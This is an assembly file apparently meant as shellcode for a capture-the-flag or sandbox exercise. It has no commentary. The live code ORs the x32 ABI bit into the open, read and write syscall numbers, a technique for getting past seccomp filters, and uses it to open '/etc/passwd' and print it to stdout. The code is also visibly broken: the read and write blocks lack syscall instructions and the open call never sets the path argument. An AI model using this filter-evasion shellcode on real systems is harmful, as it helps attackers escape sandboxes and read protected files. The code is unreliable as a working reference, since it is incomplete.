section .text
global _start
_start:
    ;push rbp
    ;mov rbp, rsp
    ;sub rsp, 0x100

    ;read filepath (absolute)
    ;mov rdi, 0  ; fd = 0
    ;lea rsi, [rbp - 0x20]  ; &pathname = rbp - 0x20
    ;mov rdx, 0x20
    ;mov rax, 0
    ;syscall

    ;call openat
    ;mov rdi, 0  ;dirfd = 0
    ;lea rsi, [rbp - 0x20]  ;&pathname = rbp - 0x20
    ;mov rdx, 0
    ;mov r10, 0
    ;mov rax, 257
    ;syscall

    xor rsi, rsi
    mov rax, 2
    or rax, 0x40000000
    syscall
    ; call read with x32 mode
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    xor rax, rax
    or rax, 0x40000000
    ; call write with x32 mode
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    or rax, 0x40000000
    path: .asciz "/etc/passwd"
